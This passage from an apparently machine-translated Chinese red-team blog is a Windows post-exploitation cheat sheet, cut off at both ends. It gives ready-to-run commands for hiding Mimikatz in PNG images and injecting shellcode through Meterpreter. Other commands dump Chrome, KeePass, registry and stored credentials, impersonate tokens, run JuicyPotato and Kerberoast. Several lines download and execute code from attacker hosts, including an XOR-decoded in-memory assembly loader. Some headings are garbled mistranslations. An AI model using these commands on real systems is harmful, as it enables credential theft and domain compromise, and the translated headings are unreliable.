GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</span><br></pre></td></tr></table></figure><p>3.18 Invoke-PSImage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/peewpw/Invoke-PSImage</span><br><span class="line"></span><br><span class="line">Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute</span><br><span class="line"></span><br><span class="line">Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.</span><br><span class="line"></span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure><h2 id="3-17-Meterpreter-Donut-Shellcode注入-NET"><a href="#3-17-Meterpreter-Donut-Shellcode注入-NET" class="headerlink" title="3.17 Meterpreter + Donut-Shellcode注入.NET"></a>3.17 Meterpreter + Donut-Shellcode注入.NET</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><span class="line"></span><br><span class="line">A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!</span><br><span class="line"></span><br><span class="line">donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin</span><br><span class="line"></span><br><span class="line">use post/windows/manage/shellcode_inject</span><br><span class="line">set SHELLCODE /tmp/payload.bin</span><br><span class="line">set SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x04-特权提升"><a href="#0x04-特权提升" class="headerlink" title="0x04 特权提升"></a>0x04 特权提升</h1><blockquote><p>参考：<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p><p>运行此脚本：<a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p></blockquote><h2 id="4-1-基本命令"><a href="#4-1-基本命令" class="headerlink" title="4.1 基本命令"></a>4.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe</span><br><span class="line">net users</span><br><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">net localgroups</span><br><span class="line">echo %logonserver%</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netstat -an</span><br><span class="line">type C:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h2 id="4-2-PowerUp-ps1（有时是快速获胜）"><a href="#4-2-PowerUp-ps1（有时是快速获胜）" class="headerlink" title="4.2 PowerUp.ps1（有时是快速获胜）"></a>4.2 PowerUp.ps1（有时是快速获胜）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks</span><br></pre></td></tr></table></figure><h2 id="4-3-锐化"><a href="#4-3-锐化" class="headerlink" title="4.3 锐化"></a>4.3 锐化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpUp</span><br><span class="line"></span><br><span class="line">C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</span><br></pre></td></tr></table></figure><h2 id="4-4-如果是公元，引进猎狗犬…"><a href="#4-4-如果是公元，引进猎狗犬…" class="headerlink" title="4.4  如果是公元，引进猎狗犬…"></a>4.4  如果是公元，引进猎狗犬…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.ps1</span><br><span class="line">SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound</span><br><span class="line"></span><br><span class="line">IEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))</span><br><span class="line"></span><br><span class="line">Invoke-CollectionMethod All</span><br><span class="line"></span><br><span class="line">Import .zip to Bloodhound</span><br><span class="line"></span><br><span class="line">If you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works.</span><br></pre></td></tr></table></figure><h2 id="4-5-Bloodhound-Python"><a href="#4-5-Bloodhound-Python" class="headerlink" title="4.5 Bloodhound-Python"></a>4.5 Bloodhound-Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fox-it/BloodHound.py.git</span><br><span class="line">cd BloodHound.py/ &amp;&amp; pip install .</span><br><span class="line"></span><br><span class="line">bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</span><br></pre></td></tr></table></figure><h2 id="4-6-明文密码"><a href="#4-6-明文密码" class="headerlink" title="4.6 明文密码"></a>4.6 明文密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># SNMP Parameters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-7-查看已安装的软件"><a href="#4-7-查看已安装的软件" class="headerlink" title="4.7 查看已安装的软件"></a>4.7 查看已安装的软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br><span class="line">net start</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line">DRIVERQUERY</span><br><span class="line"></span><br><span class="line">dir /a &quot;C:\Program Files&quot;</span><br><span class="line">dir /a &quot;C:\Program Files (x86)&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line"></span><br><span class="line">Get-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTime</span><br><span class="line"></span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br></pre></td></tr></table></figure><h2 id="4-8-弱文件夹权限"><a href="#4-8-弱文件夹权限" class="headerlink" title="4.8 弱文件夹权限"></a>4.8 弱文件夹权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Full Permissions for &apos;Everyone&apos; on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line"></span><br><span class="line">Modify Permissions for Everyone on Program Folders</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br></pre></td></tr></table></figure><h2 id="4-9-计划任务"><a href="#4-9-计划任务" class="headerlink" title="4.9 计划任务"></a>4.9 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h2 id="4-10-Powershell历史"><a href="#4-10-Powershell历史" class="headerlink" title="4.10 Powershell历史"></a>4.10 Powershell历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br></pre></td></tr></table></figure><h2 id="4-12-查看已连接的驱动器"><a href="#4-12-查看已连接的驱动器" class="headerlink" title="4.12 查看已连接的驱动器"></a>4.12 查看已连接的驱动器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">wmic logicaldisk get caption,description</span><br><span class="line"></span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br></pre></td></tr></table></figure><h2 id="4-13-查看隐私"><a href="#4-13-查看隐私" class="headerlink" title="4.13 查看隐私"></a>4.13 查看隐私</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">Look for SeImpersonate, SeDebugPrivilege etc</span><br></pre></td></tr></table></figure><h2 id="4-14-还有其他人登录吗？"><a href="#4-14-还有其他人登录吗？" class="headerlink" title="4.14 还有其他人登录吗？"></a>4.14 还有其他人登录吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure><h2 id="4-15-查看注册表自动登录"><a href="#4-15-查看注册表自动登录" class="headerlink" title="4.15 查看注册表自动登录"></a>4.15 查看注册表自动登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><span class="line"></span><br><span class="line">Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot;</span><br></pre></td></tr></table></figure><h2 id="4-16-在凭据管理器中查看存储的凭据"><a href="#4-16-在凭据管理器中查看存储的凭据" class="headerlink" title="4.16 在凭据管理器中查看存储的凭据"></a>4.16 在凭据管理器中查看存储的凭据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure><h2 id="4-17-查看未引用的服务路径"><a href="#4-17-查看未引用的服务路径" class="headerlink" title="4.17 查看未引用的服务路径"></a>4.17 查看未引用的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name</span><br></pre></td></tr></table></figure><h2 id="4-18-查看启动项"><a href="#4-18-查看启动项" class="headerlink" title="4.18 查看启动项"></a>4.18 查看启动项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><h2 id="4-19-检查AlwaysInstalledElevated注册表项"><a href="#4-19-检查AlwaysInstalledElevated注册表项" class="headerlink" title="4.19 检查AlwaysInstalledElevated注册表项"></a>4.19 检查AlwaysInstalledElevated注册表项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><h2 id="4-20-注册表中有密码吗？"><a href="#4-20-注册表中有密码吗？" class="headerlink" title="4.20 注册表中有密码吗？"></a>4.20 注册表中有密码吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-21-剩余的任何Sysrep或无人参与文件"><a href="#4-21-剩余的任何Sysrep或无人参与文件" class="headerlink" title="4.21 剩余的任何Sysrep或无人参与文件"></a>4.21 剩余的任何Sysrep或无人参与文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-22-GPP（组策略首选项）密码"><a href="#4-22-GPP（组策略首选项）密码" class="headerlink" title="4.22 GPP（组策略首选项）密码"></a>4.22 GPP（组策略首选项）密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan</span><br><span class="line"></span><br><span class="line">\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\</span><br><span class="line"></span><br><span class="line">http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption</span><br><span class="line"></span><br><span class="line">Can also use PowerUP.ps1</span><br></pre></td></tr></table></figure><h2 id="4-23-转储Chrome密码（也发布漏洞利用程序）"><a href="#4-23-转储Chrome密码（也发布漏洞利用程序）" class="headerlink" title="4.23 转储Chrome密码（也发布漏洞利用程序）"></a>4.23 转储Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="4-24-转储KeePass"><a href="#4-24-转储KeePass" class="headerlink" title="4.24 转储KeePass"></a>4.24 转储KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="4-25-令牌模拟"><a href="#4-25-令牌模拟" class="headerlink" title="4.25 令牌模拟"></a>4.25 令牌模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;</span><br><span class="line">Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)</span><br><span class="line"></span><br><span class="line">#Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><span class="line"></span><br><span class="line">Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...</span><br><span class="line">$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;</span><br><span class="line">[System.Reflection.Assembly]::Load($b) | Out-Null</span><br><span class="line">$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)</span><br><span class="line">[namespace.Class]::Main($parameters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</span><br></pre></td></tr></table></figure><h2 id="4-26-多汁土豆"><a href="#4-26-多汁土豆" class="headerlink" title="4.26 多汁土豆"></a>4.26 多汁土豆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><span class="line"></span><br><span class="line">#Reference https://ohpe.it/juicy-potato/</span><br><span class="line"></span><br><span class="line">Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege</span><br><span class="line"></span><br><span class="line">(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)</span><br><span class="line"></span><br><span class="line">JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br><span class="line"></span><br><span class="line">Mochan.exe = Payload</span><br><span class="line">5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD</span><br><span class="line"></span><br><span class="line">A CLSID is a GUID that identifies a COM class object</span><br><span class="line"></span><br><span class="line">Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc</span><br><span class="line"></span><br><span class="line">JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</span><br></pre></td></tr></table></figure><h2 id="4-27-烧烤"><a href="#4-27-烧烤" class="headerlink" title="4.27 烧烤"></a>4.27 烧烤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat</span><br><span class="line"></span><br><span class="line">because Hashcat over John anyday right?</span><br><span class="line"></span><br><span class="line">Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount</span><br><span class="line"></span><br><span class="line">Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.</span><br><span class="line"></span><br><span class="line">https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</span><br></pre></td></tr></table></figure><h2 id="4-28-用Python编写的"><a href="#4-28-用Python编写的" class="headerlink" title="4.28 用Python编写的"></a>4.28 用Python编写的</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/kerberoast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMPORTANT: the accepted formats are the following</span><br><span class="line">&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line">&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Look for vulnerable users via LDAP</span><br><span class="line">kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum</span><br><span class="line"></span><br><span class="line">Use ASREP roast against users in the ldapenum_asrep_users.txt file</span><br><span class="line">kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt</span><br><span class="line"></span><br><span class="line">Use SPN roast against users in the ldapenum_spn_users.txt file</span><br><span class="line">kerberoast spnroast 